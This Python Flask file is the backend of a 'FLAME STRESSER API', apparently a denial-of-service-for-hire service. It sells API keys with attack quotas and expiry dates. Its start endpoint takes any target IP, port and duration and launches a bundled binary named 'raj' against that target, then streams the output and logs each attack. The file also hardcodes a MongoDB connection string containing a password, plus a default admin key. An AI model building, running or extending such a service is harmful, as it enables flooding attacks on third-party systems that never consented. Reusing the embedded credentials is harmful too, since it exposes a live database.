from flask import Flask, request, jsonify, Response
import time
import secrets
import subprocess
import os
import sys
from datetime import datetime, timedelta
from pymongo import MongoClient
import threading
import queue

app = Flask(__name__)

# ================= CONFIGURATION =================
PORT = int(os.environ.get("PORT", 8080))
ADMIN_KEY = os.environ.get("ADMIN_KEY", "FLAME_MASTER_KEY_2024")
RATE_LIMIT_SECONDS = 5
MONGO_URI = "mongodb+srv://ipxkingyt:O0YAa6EVPsz49bAa@cluster0.ilafdtd.mongodb.net/?retryWrites=true&w=majority"
DB_NAME = "Cluster0"

# ================= BINARY PATH =================
BINARY_PATH = os.path.join(os.path.dirname(__file__), "raj")

if os.path.exists(BINARY_PATH):
    os.chmod(BINARY_PATH, 0o755)
    print(f"✅ Binary found: {BINARY_PATH}")
else:
    print(f"⚠️ Binary not found: {BINARY_PATH}")

# ================= MONGODB CONNECTION =================
try:
    client = MongoClient(MONGO_URI, serverSelectionTimeoutMS=5000)
    client.admin.command('ping')
    db = client[DB_NAME]
    api_keys_col = db["api_keys"]
    attack_logs_col = db["attack_logs"]
    print("✅ MongoDB connected")
except Exception as e:
    print(f"❌ MongoDB connection failed: {e}")
    api_keys_col = None
    attack_logs_col = None

# ================= IN-MEMORY STORAGE (fallback) =================
if not hasattr(app, 'memory_keys'):
    app.memory_keys = {}

# ================= HELPER FUNCTIONS =================
def generate_api_key():
    return f"FLAME_{secrets.token_urlsafe(32)}"

def execute_binary_stream(ip, port, duration):
    """Execute raj binary and yield output line by line in real-time"""
    try:
        if not os.path.exists(BINARY_PATH):
            yield f"❌ Binary not found at {BINARY_PATH}\n"
            return

        cmd = [BINARY_PATH, ip, str(port), str(duration)]
        print(f"🚀 EXECUTING: {' '.join(cmd)}")
        yield f"🚀 EXECUTING: {' '.join(cmd)}\n"
        yield f"🎯 Target: {ip}:{port}\n"
        yield f"⏱️  Duration: {duration} seconds\n"
        yield "-" * 50 + "\n"
        
        # Run binary and capture output in real-time
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, 
                                   text=True, bufsize=1, universal_newlines=True)
        
        for line in process.stdout:
            yield line
        
        process.wait()
        
        if process.returncode == 0:
            yield "\n" + "="*50 + "\n"
            yield "✅ ATTACK COMPLETED SUCCESSFULLY\n"
        else:
            yield f"\n❌ Binary exited with code: {process.returncode}\n"
        
    except Exception as e:
        yield f"\n❌ Execution failed: {str(e)}\n"

def log_attack(api_key, ip, port, duration, success):
    if attack_logs_col is not None:
        attack_logs_col.insert_one({
            "api_key": api_key,
            "target": f"{ip}:{port}",
            "duration": duration,
            "success": success,
            "timestamp": datetime.now()
        })

def validate_api_key(key):
    """Validate API key from MongoDB or memory"""
    if api_keys_col is not None:
        doc = api_keys_col.find_one({"api_key": key})
        if doc:
            return doc
    elif key in app.memory_keys:
        return app.memory_keys[key]
    return None

def update_api_key(key, update_data):
    """Update API key in MongoDB or memory"""
    if api_keys_col is not None:
        api_keys_col.update_one({"api_key": key}, {"$set": update_data})
    elif key in app.memory_keys:
        for k, v in update_data.items():
            app.memory_keys[key][k] = v

def decrement_attacks(key):
    """Decrement remaining attacks for a key"""
    doc = validate_api_key(key)
    if not doc:
        return False, "Key not found"
    
    remaining = doc.get("remaining_attacks")
    if remaining is not None and remaining <= 0:
        return False, "No attacks remaining"
    
    if remaining is not None:
        update_api_key(key, {"remaining_attacks": remaining - 1, "last_attack": time.time()})
    else:
        update_api_key(key, {"last_attack": time.time()})
    
    return True, remaining - 1 if remaining is not None else "Unlimited"

# ================= FLASK ENDPOINTS =================

@app.route('/')
def root():
    return jsonify({
        "name": "🔥 FLAME STRESSER API 🔥",
        "version": "5.0",
        "status": "running",
        "binary_available": os.path.exists(BINARY_PATH),
        "binary_name": "raj",
        "db_connected": api_keys_col is not None,
        "endpoints": {
            "attack": "/api/start?key=KEY&target=IP&port=PORT&time=DURATION",
            "generate": "/api/generate",
            "status": "/api/status",
            "health": "/health"
        }
    })

@app.route('/health')
def health():
    return jsonify({
        "status": "healthy",
        "timestamp": datetime.now().isoformat(),
        "binary_available": os.path.exists(BINARY_PATH),
        "db_connected": api_keys_col is not None
    })

@app.route('/api/generate', methods=['POST'])
def generate():
    if request.headers.get('X-Admin-Key') != ADMIN_KEY:
        return jsonify({"error": "Unauthorized"}), 401

    data = request.json or {}
    days = data.get('days', 30)
    max_attacks = data.get('max_attacks', 100)

    new_key = generate_api_key()
    expiry = datetime.now() + timedelta(days=days)

    if api_keys_col is not None:
        api_keys_col.insert_one({
            "api_key": new_key,
            "expiry": expiry,
            "remaining_attacks": max_attacks,
            "last_attack": 0.0,
            "created_at": datetime.now()
        })
    else:
        app.memory_keys[new_key] = {
            "expiry": expiry,
            "remaining_attacks": max_attacks,
            "last_attack": 0.0
        }

    return jsonify({
        "success": True,
        "api_key": new_key,
        "expires_in": f"{days} days",
        "max_attacks": max_attacks
    }), 201

@app.route('/api/start', methods=['GET'])
def start_attack_stream():
    try:
        # Get parameters from URL query string
        key = request.args.get('key')
        target = request.args.get('target')
        port = request.args.get('port')
        time_param = request.args.get('time')

        if not key or not target or not port or not time_param:
            return jsonify({"success": False, "message": "Missing parameters: key, target, port, time required"}), 400

        try:
            port = int(port)
            duration = int(time_param)
        except ValueError:
            return jsonify({"success": False, "message": "Port and time must be numbers"}), 400

        if duration < 1 or duration > 180:
            return jsonify({"success": False, "message": "Duration must be 1-180 seconds"}), 400

        # Validate API key
        key_data = validate_api_key(key)
        if not key_data:
            return jsonify({"success": False, "message": "Invalid or expired API Key"}), 401

        # Check expiry
        expiry = key_data.get("expiry")
        if expiry and expiry < datetime.now():
            return jsonify({"success": False, "message": "API key expired"}), 401

        # Check remaining attacks
        remaining = key_data.get("remaining_attacks")
        if remaining is not None and remaining <= 0:
            return jsonify({"success": False, "message": "No attacks remaining"}), 403

        # Rate limit check
        last_attack = key_data.get("last_attack", 0.0)
        now = time.time()
        if now - last_attack < RATE_LIMIT_SECONDS:
            return jsonify({"success": False, "message": f"Cooldown! Wait {RATE_LIMIT_SECONDS} seconds"}), 429

        # Decrement attacks (update in background, attack will still proceed)
        success, _ = decrement_attacks(key)
        if not success:
            return jsonify({"success": False, "message": "Failed to decrement attacks"}), 403

        # Log attack start
        log_attack(key, target, port, duration, None)  # None = pending

        # Return streaming response with binary output
        return Response(
            execute_binary_stream(target, port, duration),
            mimetype='text/plain',
            headers={
                "X-Attack-Id": str(int(time.time())),
                "X-Target": f"{target}:{port}",
                "X-Duration": str(duration)
            }
        )

    except Exception as e:
        return jsonify({"success": False, "message": str(e)}), 500

@app.route('/api/status', methods=['GET'])
def check_status():
    key = request.args.get('key')
    if not key:
        return jsonify({"error": "Missing key parameter"}), 400

    key_data = validate_api_key(key)
    if not key_data:
        return jsonify({"error": "Invalid API key"}), 404

    remaining = key_data.get("remaining_attacks", "Unlimited")
    expiry = key_data.get("expiry")
    expires_in = 0
    if expiry:
        expires_in = max(0, int((expiry - datetime.now()).total_seconds()))

    return jsonify({
        "valid": True,
        "remaining_attacks": remaining,
        "expires_in_seconds": expires_in,
        "last_attack": key_data.get("last_attack", 0)
    }), 200

@app.route('/api/revoke', methods=['POST'])
def revoke_key():
    if request.headers.get('X-Admin-Key') != ADMIN_KEY:
        return jsonify({"error": "Unauthorized"}), 401

    api_key = request.json.get('api_key')
    if not api_key:
        return jsonify({"error": "Missing api_key"}), 400

    if api_keys_col is not None:
        result = api_keys_col.delete_one({"api_key": api_key})
    elif api_key in app.memory_keys:
        del app.memory_keys[api_key]
        result = type('obj', (object,), {'deleted_count': 1})()
    else:
        result = type('obj', (object,), {'deleted_count': 0})()

    if result.deleted_count:
        return jsonify({"success": True, "message": "API key revoked"}), 200
    return jsonify({"error": "API key not found"}), 404

@app.route('/api/stats', methods=['GET'])
def stats():
    if request.headers.get('X-Admin-Key') != ADMIN_KEY:
        return jsonify({"error": "Unauthorized"}), 401

    total_keys = 0
    active_keys = 0

    if api_keys_col is not None:
        total_keys = api_keys_col.count_documents({})
        active_keys = api_keys_col.count_documents({"expiry": {"$gt": datetime.now()}})
    else:
        total_keys = len(app.memory_keys)

    return jsonify({
        "total_api_keys": total_keys,
        "active_api_keys": active_keys,
        "rate_limit_seconds": RATE_LIMIT_SECONDS,
        "binary_available": os.path.exists(BINARY_PATH),
        "binary_name": "raj"
    }), 200

# ================= MAIN =================
if __name__ == '__main__':
    print("\n" + "="*60)
    print("🔥 FLAME STRESSER API - COMPLETE EDITION 🔥")
    print("="*60)
    print(f"📍 Port: {PORT}")
    print(f"🔑 Admin Key: {ADMIN_KEY}")
    print(f"⏱️  Rate Limit: {RATE_LIMIT_SECONDS}s")
    print(f"📁 Binary Path: {BINARY_PATH}")
    print(f"✅ Binary Available: {os.path.exists(BINARY_PATH)}")
    print(f"🗄️  MongoDB: {'Connected' if api_keys_col is not None else 'Using Memory Storage'}")
    print("="*60 + "\n")
    app.run(host='0.0.0.0', port=PORT, debug=False, threaded=True)
